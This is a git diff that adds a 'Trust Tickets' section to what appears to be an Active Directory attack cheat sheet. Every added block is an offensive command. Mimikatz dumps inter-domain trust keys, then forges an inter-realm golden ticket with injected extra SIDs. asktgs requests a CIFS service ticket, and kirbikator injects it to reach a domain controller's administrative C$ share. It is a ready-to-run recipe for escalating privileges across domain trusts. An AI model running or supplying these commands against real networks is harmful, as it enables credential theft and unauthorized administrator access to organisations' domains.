@@ -925,6 +925,30 @@ CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXI
 
 ### Trust Tickets
 
+
+
+
+*Dumping Trust Key*
+```powershell
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+```
+
+*Forging IR-TGT using Trust key*
+```powershell
+Invoke-Mimikatz -Command '"Kerberos::golden /domain:$domain /sid:$sid /sids:$extra_sids /rc4:$rc4_hash /user:Administrator /service:krbtgt /target:$target /ticket:$path/to/trust_ticket.kirbi"'
+```
+
+*get TGS for CIFS service*
+```powershell
+asktgs path/to/trust_ticket.kirbi CIFS/ps-dc.powershell.local
+```
+
+*use TGS for CIFS service*
+```powershell
+kirbikator.exe lsa .\CIFS.$domain.kirbi ls \\$domain\`c$
+```
+
+
 ### Using KRBTGT hash 
 
 ```powershell
